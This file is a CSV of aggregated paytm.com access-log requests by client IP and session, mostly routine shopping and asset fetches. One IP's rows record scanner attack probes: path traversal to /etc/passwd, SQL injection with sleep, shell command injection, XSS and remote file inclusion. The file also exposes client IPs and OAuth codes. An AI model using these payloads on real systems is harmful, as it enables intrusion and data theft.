clientIp,sessionId,request,count(request)
106.77.70.229,11,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
107.167.108.30,13,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,2
112.79.36.141,18,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
115.160.247.18,25,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
117.214.210.10,28,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
117.248.241.201,29,https://paytm.com:443/shop/authresponse?code=a163906e-1fe6-4fc8-83f0-75dc4edc79d9&state=null,1
122.167.155.89,33,https://paytm.com:443/papi/nps/merchantrating?merchant_id=69341&channel=web&version=2,1
123.252.213.94,38,https://paytm.com:443/shop/cart?channel=web&version=2,1
221.120.106.113,64,https://paytm.com:443/shop/cart/checkout?channel=web&version=2,1
27.97.14.2,64,http://paytm.com:80/basic,1
49.14.119.16,65,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.css?ver=1.3,1
59.177.78.175,74,https://paytm.com:443/offer/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4,1
59.180.139.58,74,https://paytm.com:443/,1
103.245.118.42,5,https://paytm.com:443/papi/rr/products/12676758/statistics?channel=web&version=2,1
107.167.108.94,11,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.transitions.css?ver=4.2.2,1
111.91.75.75,16,https://paytm.com:443/offer/wp-content/uploads/2014/12/examples.css,1
111.91.75.75,16,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20,1
115.248.223.50,24,https://paytm.com:443/shop/h/electronics?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff15,1
117.196.228.249,24,https://paytm.com:443/shop/cart?channel=web&version=2,1
117.246.171.82,29,https://paytm.com:443/,1
123.201.30.39,30,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.0.3,1
123.252.242.220,30,https://paytm.com:443/papi/v1/promosearch/product/11114718/offers?parent_id=11114724&price=1347&channel=web&version=2,1
125.63.68.99,30,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/js/script.js?ver=4.2.2,1
175.100.147.7,40,https://paytm.com:443/papi/rr/products/9360059/statistics?channel=web&version=2,1
180.215.46.112,40,https://paytm.com:443/shop/cart,4
203.91.192.4,43,https://paytm.com:443/shop/orderdetail/1112518220?actions=1&channel=web&version=2,2
27.59.17.53,53,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
43.248.239.226,56,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
43.250.134.171,57,https://paytm.com:443/checkout,2
106.76.245.241,8,https://paytm.com:443/shop/g/electronics/mobile-accessories/mobiles-accessories-store/price-never-before?gclid=COC5t6ek78YCFRMIvAod19UHlw,1
106.78.9.17,8,https://www.paytm.com:443/,1
117.200.102.0,17,https://paytm.com:443/,1
117.212.112.163,17,https://paytm.com:443/offer/wp-content/uploads/2015/07/470X220_books.jpg,1
117.253.99.231,20,https://paytm.com:443/shop/p/sai-arpan-designer-double-bed-ac-blanket-assorted-HBSHET00BLANKET9SAASFR,1
14.139.98.5,25,https://paytm.com:443/papi/v1/expresscart/verify,1
167.220.236.49,33,https://paytm.com:443/offer/termsconditions/,1
203.143.186.45,48,https://paytm.com:443/offer/wp-includes/js/jquery/ui/button.min.js?ver=1.11.4,1
204.74.20.14,52,https://paytm.com:443/papi/v1/promosearch/product/12635999/offers?parent_id=8245954&price=893&channel=web&version=2,1
49.248.251.50,61,https://paytm.com:443/papi/v1/promosearch/product/16265785/offers?parent_id=12271526&price=99&channel=web&version=2,1
49.248.251.50,61,https://paytm.com:443/api/oauth2/user/clients?channel=web&version=2,1
59.88.215.115,65,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
1.23.97.159,1,https://paytm.com:443/shop/cart,1
101.214.24.111,8,https://paytm.com:443/offer/wp-content/uploads/2015/07/470X220_books.jpg,1
101.57.168.196,8,https://paytm.com:443/shop/cart?channel=web&version=2,1
101.59.84.34,8,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.carousel.min.css?ver=2.0.0,1
101.62.239.57,8,https://paytm.com:443/faq?option=paytm-wallet,1
103.21.234.155,12,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
103.25.85.145,13,https://paytm.com:443/offer/wp-content/plugins/wp-thumbnail-slider/css/wpt-slide.css?ver=4.2.2,1
106.216.154.61,13,https://paytm.com:443/offer/wp-content/uploads/2015/07/bargain.jpg,1
112.196.38.234,15,https://paytm.com:443/papi/nps/merchantrating?merchant_id=22571&channel=web&version=2,1
115.250.108.206,21,https://paytm.com:443/shop/g/automotive/the-automotive-store/40-cashback-on-helmets?utm_medium=email&utm_source=getamplify&utm_campaign=MegaSale-14072015,1
115.250.108.206,21,https://paytm.com:443/offer/wp-content/themes/twentytwelve/style.css?ver=4.2.2,3
117.227.148.170,29,https://paytm.com:443/shop/cart?channel=web&version=2,1
117.240.212.227,29,https://paytm.com:443/papi/nps/merchantrating?merchant_id=41648&channel=web&version=2,2
120.56.157.16,30,https://paytm.com:443/shop/orderhistory?pagesize=10&channel=web&version=2,1
120.60.32.3,30,https://paytm.com:443/shop/ad/paytmAd?cat=Electricity&op=Paschim%20Gujarat%20Vij&paytm=new,1
120.60.32.3,30,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,1
122.172.29.186,36,https://paytm.com:443/shop/orderdetail/1117831425?channel=web&version=2,2
123.236.51.199,37,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,1
125.17.16.146,41,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.transitions.css?ver=4.2.2,1
151.151.109.25,48,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
183.82.1.177,55,https://paytm.com:443/offer/wp-includes/js/jquery/jquery.masonry.min.js?ver=3.1.2,1
203.147.88.34,60,https://paytm.com:443/papi/v1/promosearch/product/14066031/offers?parent_id=0&price=533&channel=web&version=2,1
203.147.88.34,60,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
203.55.173.2,61,https://paytm.com:443/papi/v1/expresscart/verify,1
37.228.105.68,74,https://paytm.com:443/styles/app.css,1
43.224.156.82,76,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,1
49.206.175.58,80,https://paytm.com:443/offer/wp-content/uploads/2015/07/cc.png,1
59.162.11.200,80,https://paytm.com:443/shop/logout?channel=web&version=2,1
1.38.19.237,0,https://paytm.com:443/shop/ad/paytmAd?cat=Mobile&op=Vodafone&paytm=new,1
103.39.130.254,4,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2fwindows%2fwin.ini/premium-bedsheets-extra-35-off,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2fetc%2fpasswd/min-55-cashback-on-bedsheets,1
106.51.132.54,7,https://paytm.com:443/shop/h/books-media-stationery/%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29%29,1
106.51.132.54,7,https://paytm.com:443/%24%7b%40print%28md5%28acunetix_wvs_security_test%29%29%7d%5c/security/,1
106.51.132.54,7,https://paytm.com:443/offer%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20/greencart/,1
106.51.132.54,7,https://paytm.com:443/shop/h/brand-store/-1%20or%20102%3d102,1
106.51.132.54,7,https://paytm.com:443/shop/g/-1%22%20or%20%2291%22%3d%2291/home-and-kitchen-appliances,1
106.51.132.54,7,https://paytm.com:443/shop/g/electronics/the-electronic-store/upto-rs%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20-1000-off-on-external-hard-disk-drive,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/premium-bedsheets-extra-%22%3bcat%20%2fetc%2fpasswd%3b%22-off,1
106.51.132.54,7,https://paytm.com:443/%22%3bprint%28md5%28acunetix_wvs_security_test%29%29%3b%24a%3d%22/bug-bounty/,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/big-day-kitchen-extra-1000%22%3dsleep%284%29%3d%22-off,1
106.51.132.54,7,https://paytm.com:443/stores/xmlrpc.php?%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini,1
106.51.132.54,7,https://paytm.com:443/offer/%7cdir/,1
106.51.132.54,7,https://paytm.com:443/http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt%3f%2500.jpg/greencart/,1
106.51.132.54,7,"https://paytm.com:443/'\"()&%251<ScRiPt%20>prompt(981045)</ScRiPt>/about",1
106.67.4.80,8,https://paytm.com:443/papi/v1/promosearch/product/12627603/offers?parent_id=12630409,1
112.79.35.30,12,http://paytm.com:80/,1
112.79.38.158,15,http://m.paytm.com:80/indexApp.htm,1
115.249.127.116,18,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
116.202.36.199,19,https://paytm.com:443/shop/p/operations-research-CMPLX9789380856322_21335,1
117.204.172.142,24,https://paytm.com:443/papi/v1/promosearch/product/7585159/offers?parent_id=7585482,1
117.223.154.115,25,https://paytm.com:443/papi/rr/products/16923901/statistics?channel=web&version=2,1
122.162.123.97,29,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
150.129.207.97,44,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/js/script.js?ver=4.2.2,1
168.235.197.12,54,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/flexslider/flexslider.css?ver=2.2.0,1
180.151.120.73,57,https://paytm.com:443/offer/wp-content/uploads/2014/12/slider-pro.min_.css,1
180.87.253.211,61,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.theme.css?ver=4.2.2,1
182.19.65.227,61,https://paytm.com:443/papi/v1/promosearch/product/2269011/offers?parent_id=0&price=269&channel=web&version=2,1
202.131.103.131,71,https://paytm.com:443/shop/cart?channel=web&version=2,3
202.56.234.62,71,https://paytm.com:443/offer/wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4,1
203.99.198.17,74,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,2
203.99.198.17,74,https://paytm.com:443/offer/wp-content/uploads/2015/07/meruwer_1.jpg,1
203.99.198.17,74,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/css/flexslider.css?ver=4.2.2,1
223.176.3.130,77,https://paytm.com:443/api/oauth2/user/clients?channel=web&version=2,1
223.227.191.192,77,https://paytm.com:443/shop/h/home-and-kitchen?utm_medium=affiliate&utm_source=icubes_mailer&utm_campaign=HomeKitchen-MegaSale-20052015&utm_term=%7Baffiliate_id%7D,1
49.205.95.186,81,https://paytm.com:443/shop/summary/1118054148,1
54.169.78.51,81,https://paytm.com:443/shop/p/seagate-backup-plus-slim-1tb-portable-external-hard-drive-black-SEAGATE_SRD00F1_1TB_BLACK_42052,1
54.169.78.51,81,https://paytm.com:443/shop/p/lenovo-a390-black-Lenovo_A390_4GB_Black_20663,1
54.169.78.51,81,https://paytm.com:443/shop/p/karbonn-titanium-s1-plus-white-KARBONN_TITANIUMS1PLUS_4GB_WHITE_33804,1
54.169.78.51,82,https://paytm.com:443/shop/p/samsung-earphone-3-5-mm-CMPLXSAMSUNG_EHS44ASSBECINU_00_00,1
54.169.78.51,82,https://paytm.com:443/shop/p/samsung-galaxy-star-pro-s7262-midnight-black-Samsung_GalaxyStarProS7262_4GB_MidnightBlack_22649,1
54.169.78.51,82,https://paytm.com:443/shop/p/micromax-canvas-fire-a104-white-gold-CMPLXMICROMAX_A104_4GB_WHITE&GOLD,1
54.169.78.51,82,https://paytm.com:443/shop/p/dell-3543-inspiron-3543541tbisu-core-i5-5th-gen-4-gb-1-tb-15-6-inch-ubuntu-silver-laptop-LAPDELL-3543-INDUMM202567E230623_51945,1
54.169.78.51,83,https://paytm.com:443/shop/p/htc-desire-820-white-CMPLXHTC_DESIRE820_16GB_WHITE,1
54.169.78.51,84,https://paytm.com:443/shop/p/samsung-galaxy-alpha-sm-g850yzkeinu-silver-CMPLXSAMSUNG_SMG850YZKEINU_32GB_SILVER,1
101.222.229.149,4,https://paytm.com:443/shop/cart,1
115.245.182.147,13,https://paytm.com:443/shop/cart,1
117.192.191.59,15,https://paytm.com:443/shop/h/electronics?utm_source=Affiliates&utm_medium=VCOMM&utm_campaign=VCOMM-generic&utm_term=24890,1
117.196.234.73,15,https://paytm.com:443/offer/wp-content/plugins/logo-slider/lgs_jquery.cycle2.js?ver=4.2.2,1
117.199.237.85,16,https://paytm.com:443/shop/cart?channel=web&version=2,2
119.73.243.172,18,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
120.89.77.91,20,https://paytm.com:443/offer/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4,1
122.165.52.64,21,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/css/flexslider.css?ver=4.2.2,1
122.168.30.207,21,https://paytm.com:443/shop/h/electronics?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff15,1
122.171.153.29,22,https://paytm.com:443/shop?utm_source=affiliates&utm_medium=icubeswire&utm_campaign=icubeswire&utm_term=10480,1
155.35.46.62,27,https://paytm.com:443/shop/cart?channel=web&version=2,4
182.64.90.212,39,https://paytm.com:443/offer/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4,1
188.40.135.194,42,https://paytm.com:443/papi/v1/promosearch/product/2585624/offers?parent_id=2586492&price=1099,1
188.40.135.194,43,https://paytm.com:443/papi/v1/promosearch/product/10556267/offers?parent_id=10556402&price=499,1
188.40.135.194,44,https://paytm.com:443/papi/v1/promosearch/product/1984976/offers?parent_id=0&price=599,1
188.40.135.194,44,https://paytm.com:443/papi/v1/promosearch/product/4089130/offers?parent_id=10544970&price=501,1
188.40.135.194,46,https://paytm.com:443/papi/v1/promosearch/product/11163824/offers?parent_id=11163944&price=499,1
219.64.186.4,53,https://paytm.com:443/shop/cart?channel=web&version=2,1
223.181.216.207,55,https://paytm.com:443/shop/log,1
223.225.195.179,55,https://paytm.com:443/shop/login?isIframe=true&theme=mp-html5,1
223.30.129.82,55,https://paytm.com:443/shop/cart?channel=web&version=2,1
49.204.82.158,65,https://paytm.com:443/papi/v1/promosearch/product/6301748/offers?parent_id=4479118&price=3399&channel=web&version=2,1
52.74.59.227,67,https://paytm.com:443/shop/p/seagate-expansion-falcun-1-tb-external-hard-disk-SEAGATE_STDR1000300_1TB_BLACK_21501,2
52.74.59.227,67,https://paytm.com:443/shop/p/dell-inspiron-5542-core-i5-4210u-4gb-500gb-15-6-2gb-graphics-ubuntu-black-DELL_5542_4GBDDR3_BLACK_21052,1
52.74.59.227,67,https://paytm.com:443/shop/p/micromax-bolt-a067-blue-MICROMAX_BOLTA67_512MB_BLUE_20663,1
52.74.59.227,67,https://paytm.com:443/shop/p/htc-desire-820-white-HTC_DESIRE820_16GB_WHITE_23206,1
52.74.59.227,67,https://paytm.com:443/shop/p/sony-xperia-z1-white-Sony_XperiaZ1_16GB_White_35773,2
52.74.59.227,67,https://paytm.com:443/shop/p/karbonn-titanium-s15-white-MOBKARBONN-TITADUMM1416CA27B40_34629,1
52.74.59.227,67,https://paytm.com:443/shop/p/panasonic-t31-black-cmplxpanasonic_t31_4gb_black,1
52.74.59.227,67,https://paytm.com:443/shop/p/hp-slate-7-voice-tab-snow-white-MOBHP-SLATE-7-VBEST22371B826E7F,1
52.74.59.227,67,https://paytm.com:443/shop/p/lenovo-ideapad-g50-45-apu-dual-core-2-gb-ddr3-500-gb-hdd-15-6-inch-windows-8-black-80e3005rin-LAPLENOVO-IDEAPFAST5194575D22E95,1
52.74.59.227,67,https://paytm.com:443/shop/p/micromax-canvas-knight-cameo-a290-white-gold-MOBMICROMAX-CANNXTE29901C08A515A,1
52.74.59.227,68,https://paytm.com:443/shop/p/micromax-canvas-hd-plus-a190-black-MOBMICROMAX-CANSM-T75457A92D4DB5,1
52.74.59.227,68,https://paytm.com:443/shop/p/dell-inspiron-15-3542-laptop-4th-gen-intel-core-i5-4gb-ram-500-gb-hdd-15-6-inches-win-8-1-sl-silver-LAPDELL-INSPIROCOMP37841BA5861AD_32515,1
66.249.71.110,73,https://paytm.com:443/shop/p/fashiondeal-purple-chanderi-saree-APPFASHIONDEAL-FASH274768A7AB87?_escaped_fragment_=,1
66.249.71.110,74,https://paytm.com:443/shop/p/hpc-gas-stove-HOMHPC-GAS-STOVPARA33438324B7BAB?_escaped_fragment_=,1
66.249.71.110,74,https://paytm.com:443/shop/p/sbl-pvt-ltd-silk-n-stay-with-glycerine-berberis-calendula-soap-pack-of-6-USOAPS0SBLSNS125SDNANA,1
70.39.185.124,76,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/images/ui-icons_2e83ff_256x240.png,1
1.39.97.64,4,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/js/jquery.flexslider-min.js?ver=4.2.2,1
101.212.68.64,5,https://paytm.com:443/shop/h/electronics/home-appliances?src=gtr1,1
103.1.83.6,5,https://paytm.com:443/papi/v1/promosearch/product/14232604/offers?parent_id=10754411,1
115.111.245.164,22,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
117.204.18.239,26,https://paytm.com:443/help,1
117.215.177.134,27,https://paytm.com:443/shop/cart?channel=web&version=2,1
122.160.8.42,36,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
122.167.236.215,37,https://paytm.com:443/offer/wp-includes/js/jquery/ui/accordion.min.js?ver=1.11.4,1
14.139.236.210,41,https://paytm.com:443/offer/wp-content/uploads/2015/07/autom.jpg,1
14.139.240.251,44,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,3
15.219.169.69,49,https://paytm.com:443/offer/wp-content/uploads/2015/07/470X220_books.jpg,1
150.242.151.14,49,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.carousel.css?ver=4.2.2,1
164.100.133.253,51,https://paytm.com:443/offer/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20,1
183.87.126.235,65,https://paytm.com:443/papi/nps/merchantrating?merchant_id=22225&channel=web&version=2,2
202.142.80.128,68,https://paytm.com:443/blog/wp-content/plugins/jetpack/modules/sharedaddy/images/loading.gif,1
203.171.210.19,73,https://paytm.com:443/papi/rr/products/2691662/statistics?channel=web&version=2,1
223.176.17.71,79,https://paytm.com:443/shop/g/home-and-kitchen/home-furnishing/bed-sheets-combos,1
223.30.180.126,80,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,2
103.18.120.184,7,https://paytm.com:443/offer/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,2
103.24.175.51,7,https://paytm.com:443/papi/v1/promosearch/product/11997171/offers?parent_id=6867722&price=26480&channel=web&version=2,1
106.219.38.2,12,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
106.220.180.99,12,https://paytm.com:443/login,1
106.76.167.8,12,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
111.93.72.22,16,https://paytm.com:443/shop/cart?channel=web&version=2,1
112.133.211.120,17,https://paytm.com:443/offer/wp-content/uploads/2015/07/bedlinen.jpg,1
112.133.229.115,18,https://paytm.com:443/shop?utm_source=affiliate&utm_medium=innovativelead&utm_campaign=innovativelead-generic&utm_term=28,1
117.214.186.57,26,https://paytm.com:443/papi/nps/merchantverification,1
120.29.232.107,34,https://paytm.com:443/offer/wp-includes/js/jquery/ui/button.min.js?ver=1.11.4,1
120.59.137.9,37,https://paytm.com:443/papi/rr/products/12058313/statistics?channel=web&version=2,1
145.62.32.129,44,https://paytm.com:443/offer/wp-content/themes/twentytwelve/js/navigation.js?ver=20140318,1
182.72.170.150,48,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.theme.default.css?ver=2.0.0,1
223.177.182.83,61,https://paytm.com:443/shop/cart?channel=web&version=2,1
37.228.106.165,62,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/css/images-thumbnail-sliderv1-style.css?ver=4.2.2,1
49.138.75.4,62,https://paytm.com:443/shop/orderdetail/1116585461?channel=web&version=2,1
59.93.126.218,69,https://paytm.com:443/shop/orderhistory?before_id=834374649&pagesize=10&channel=web&version=2,1
103.15.60.101,4,https://paytm.com:443/papi/v1/expresscart/verify,1
103.245.15.1,6,https://paytm.com:443/?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff3-E,2
111.93.187.122,14,https://paytm.com:443/shop/authresponse?code=d00baa27-023a-43a5-899b-5bd006061dee&state=null,1
117.193.54.232,23,https://paytm.com:443/online-reliance-netconnect-plus-recharge.htm,1
117.198.99.241,23,https://paytm.com:443/papi/v1/promosearch/product/10719671/offers?parent_id=10725242,1
117.212.172.96,26,https://paytm.com:443/shop/cart?channel=web&version=2,2
122.179.162.1,28,https://paytm.com:443/papi/v1/promosearch/product/9457611/offers?parent_id=9457641&price=1045&channel=web&version=2,1
173.237.189.109,37,https://paytm.com:443/shop/p/chennai-ebazaar-crepe-designer-unstitched-suit-APPCHENNAI-EBAZCHEN33027211ECC1E?utm_source=Affiliates&utm_medium=Payoom&utm_campaign=Payoom,1
183.83.135.197,44,https://paytm.com:443/favicon.ico,1
183.83.49.108,44,https://paytm.com:443/shop/orderhistory?pagesize=10&channel=web&version=2,1
223.227.169.15,48,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
59.89.122.14,52,https://paytm.com:443/shop/cart?channel=web&version=2,2
59.96.199.60,52,https://paytm.com:443/shop/cart,1
1.39.62.136,3,https://paytm.com:443/shop/login?isIframe=true&theme=mp-html5,1
103.37.201.67,12,https://paytm.com:443/blog/wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css?ver=3.1,1
112.133.229.126,29,https://paytm.com:443/favicon.ico,1
115.111.223.59,39,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/images/vl-box/controls.png,1
115.99.48.87,42,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/style.css?ver=1.26,1
115.99.48.87,42,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
117.197.122.241,42,https://paytm.com:443/shop/g/men/beauty-and-personal-care/fragrances/perfumes,3
117.204.165.61,42,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=OMG&utm_campaign=OMG&utm_term=745750_,1
117.205.104.99,42,https://paytm.com:443/offer/wp-content/plugins/wp-thumbnail-slider/css/wpt-slide.css?ver=4.2.2,1
117.226.9.87,43,https://paytm.com:443/shop/summary/1116231845,1
121.58.173.7,46,https://paytm.com:443/shop/cart?channel=web&version=2,2
182.73.13.90,71,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21676&channel=web&version=2,2
183.83.131.49,72,https://paytm.com:443/shop/cart?channel=web&version=2,3
202.177.231.42,72,https://paytm.com:443/shop/cart?channel=web&version=2,2
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/2927693/offers?parent_id=0&price=195,1
52.74.219.71,82,https://paytm.com:443/shop/p/voltas-182dyr-1-5-ton-2-star-split-ac-LARVOLTAS-182DYROCK359151A31E30F,1
52.74.219.71,82,https://paytm.com:443/shop/p/milton-exotique-white-and-pink-casserole-capacity-1000-ml-HCASSRWHITE_PINKFCPK10,1
52.74.219.71,82,https://paytm.com:443/shop/p/pluto-CMPLX9789351365082_271,1
52.74.219.71,82,https://paytm.com:443/shop/p/womens-club-white-sandals-CMPLXFOOWOMENS-CLUB-SHOE42268CB0F07B3,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/4895809/offers?parent_id=12914277&price=3999,1
52.74.219.71,83,https://paytm.com:443/shop/p/puma-men-shoes-red-and-white-cmplxmsprts0018761801qprd10,1
52.74.219.71,83,https://paytm.com:443/papi/v1/promosearch/product/7493324/offers?parent_id=7493429&price=688,1
52.74.219.71,83,https://paytm.com:443/shop/p/footnstyle-cool-grey-and-white-casual-shoe-size-10-CMPLXMCASUL00000FS308FYGR10,1
52.74.219.71,83,https://paytm.com:443/shop/p/asus-zenfone-5-CMPLXASUS_A501CG_8GB_YELLOW,1
52.74.219.71,83,https://paytm.com:443/shop/p/sandisk-ultra-dual-16gb-pen-drive-SANDISK_SANDISKULTRADUAL_16GB_BLACK_136,1
52.74.219.71,83,https://paytm.com:443/shop/p/red-tape-men-formal-shoes-size-10-CMPLXMFRMAL000RTS7301DCBK10,1
52.74.219.71,83,https://paytm.com:443/papi/v1/promosearch/product/6627725/offers?parent_id=0&price=0,2
52.74.219.71,83,https://paytm.com:443/shop/p/scullers-sport-god-of-sports-polo-t-shirt-size-38-CMPLXMTSHRT0000XR0106NRMU38,1
52.74.219.71,83,https://paytm.com:443/shop/p/apple-iphone-5c-16-gb-blue-CMPLXApple_IPHONE5C_32GB_Blue,1
52.74.219.71,83,https://paytm.com:443/shop/p/playboy-outdoor-track-pant-black-1-piece-pack-CMPLXAPPPLAYBOY-OUTDVIHA296677AF1CDD4,1
52.74.219.71,83,https://paytm.com:443/shop/p/sejm-duck-baby-bath-squeeze-toy-duck-wid-pleasant-sound-set-of-4-KIDSEJM-DUCK-BASHIV352922CAF10E4,1
52.74.219.71,84,https://paytm.com:443/shop/p/samsung-e2252-pure-white-cmplxsamsung_e2252_20mb_purewhite,1
52.74.219.71,84,https://paytm.com:443/shop/p/apple-iphone-5s-16-gb-gold-Apple_IPHONE5S_16GB_Gold_22943,1
52.74.219.71,84,https://paytm.com:443/papi/v1/promosearch/product/9349296/offers?parent_id=12338005&price=2899,1
52.74.219.71,85,https://paytm.com:443/shop/p/nicer-dicer-plus-multi-chopper-vegetable-cutter-HOMNICER-DICER-ACME317842D508C07,1
52.74.219.71,85,https://paytm.com:443/papi/v1/promosearch/product/12776967/offers?parent_id=12777038&price=1749,1
52.74.219.71,85,https://paytm.com:443/papi/v1/promosearch/product/4340618/offers?parent_id=4341003&price=299,2
52.74.219.71,85,https://paytm.com:443/papi/v1/promosearch/product/10096011/offers?parent_id=1887904&price=924,1
52.74.219.71,85,https://paytm.com:443/papi/v1/promosearch/product/11995363/offers?parent_id=11995325&price=167,1
52.74.219.71,85,https://paytm.com:443/papi/v1/promosearch/product/12193020/offers?parent_id=12193030&price=92500,1
52.74.219.71,85,https://paytm.com:443/shop/p/canary-london-black-leatherite-and-polyester-jacket-size-36-APPCANARY-LONDOCANA2150350A71198,2
52.74.219.71,85,https://paytm.com:443/shop/p/nike-blue-sport-shoes-size-9-FOONIKE-BLUE-SPVIBG608806A1EAEF8,1
